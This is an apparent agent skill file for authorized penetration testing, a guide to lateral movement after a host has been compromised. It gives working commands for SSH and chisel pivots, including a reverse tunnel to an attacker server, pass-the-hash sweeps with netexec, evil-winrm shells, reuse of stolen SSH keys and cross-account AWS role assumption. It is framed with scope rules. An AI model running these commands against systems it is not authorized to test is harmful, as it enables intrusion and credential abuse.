---
name: lateral-movement-overview
description: Move from one compromised host to another using a credential, tunnel, or trust relationship — non-AD-specific (SSH pivoting, port forwarding, cloud cross-account movement). Use when you have a foothold and want to reach a host not directly reachable from your operator box. Do not use for domain-credential-based movement (pass-the-hash via netexec, WMI/PsExec) — see active-directory instead.
phases: [lateral-movement, post-exploitation]
tags: [pivoting, tunneling, ssh, cloud]
mitre: [T1021, T1090, T1570]
requires_tools: [chisel, ligolo-ng, evil-winrm]
---

Lateral movement has two separable parts: **reaching** a network segment you can't route to
directly (pivoting/tunneling), and **authenticating** to a host once you can reach it. Solve
reachability first — a working credential is useless against a host with no route to it.

## Reachability — pivoting and tunneling

**SSH** is the simplest pivot when you have SSH access to a dual-homed host:
```
ssh -D 1080 user@pivot-host                              # SOCKS proxy — proxychains everything through it
ssh -L 8080:internal-host:80 user@pivot-host              # local port forward — one specific service
ssh -R 9001:127.0.0.1:9001 user@pivot-host                # reverse tunnel — expose your tooling INTO the pivot's network
```
`proxychains nmap -sT -Pn <internal-range>` routes any tool through the SOCKS proxy without the
tool needing native proxy support (works for `nmap`/`curl`/`netexec`/most CLI tools; `-sT` only —
SYN scans don't traverse a SOCKS proxy).

**Without SSH** (a web shell, an agent-less foothold): `chisel` (Go, single static binary, works
through HTTP so it survives more restrictive egress filtering) or `ligolo-ng` (creates a real
network interface via TUN, so standard tools route through it without `proxychains`):
```
# attacker: chisel server -p 8000 --reverse
# pivot:    chisel client <attacker>:8000 R:socks
```

## Authentication once reachable

- **Reused local-admin password/hash across hosts** (common on unmanaged Windows fleets) —
  `netexec smb <RANGE> -u <USER> -H <NTHASH>` to find every host where it lands admin (the
  `(Pwn3d!)` marker), independent of any AD context.
- **WinRM** (5985/5986) with valid creds → interactive shell: `evil-winrm -i <HOST> -u <USER> -p
  <PASS>` (or `-H <NTHASH>` for pass-the-hash).
- **SSH key reuse** — a private key found via `credential-access` often works unmodified against
  other hosts in the same fleet (shared provisioning/golden image); try it broadly before
  assuming it's single-host.
- **Cloud cross-account/cross-role** — an IAM role's `AssumeRolePolicy` or a service account's
  attached permissions may grant access into a *different* account/project than the one you
  started in: `aws sts assume-role --role-arn <ARN> --role-session-name pivot` — enumerate
  assumable roles before assuming lateral movement stops at the account boundary.

## Do not

- Assume a segment is unreachable because your operator box can't route to it directly — check
  for a pivot host (dual-homed, in both networks) before concluding it's out of reach.
- Spray a credential across a whole discovered range without checking it's in scope first — see
  `shared/governance-rules`; "I could reach it" isn't "it was authorized."
- Leave a tunnel/proxy running after the engagement task that needed it is done — tear down
  `chisel`/SSH tunnel processes, they're a standing foothold if forgotten.
